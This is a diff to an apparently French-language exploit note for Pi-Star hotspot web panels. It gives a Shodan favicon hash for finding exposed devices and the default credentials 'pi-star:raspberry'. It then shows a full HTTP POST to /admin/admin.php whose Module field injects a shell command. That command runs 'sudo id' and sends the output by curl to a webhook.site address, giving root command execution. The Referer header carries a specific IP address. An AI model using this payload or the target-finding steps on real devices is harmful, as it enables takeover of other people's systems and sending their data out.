@@ -3,7 +3,7 @@ shodan http.favicon.hash:432733105
 default cred sur ssh et interface web
 pi-star:raspberry
 
-Post Auth RCE via le web
+Post Auth Root RCE via le web
 
 POST /admin/admin.php HTTP/1.1
 Host: xxxxxx
@@ -19,4 +19,4 @@ Connection: close
 Referer: http://121.169.46.217/admin/admin.php
 Upgrade-Insecure-Requests: 1
 
-RefName=REF001&Letter=C&Link=UNLINK&Module=$(curl%20http://webhook.site/xxxx/$(id))
+RefName=REF001&Letter=C&Link=UNLINK&Module=$(curl%20http://webhook.site/xxxx/$(sudo%20id))
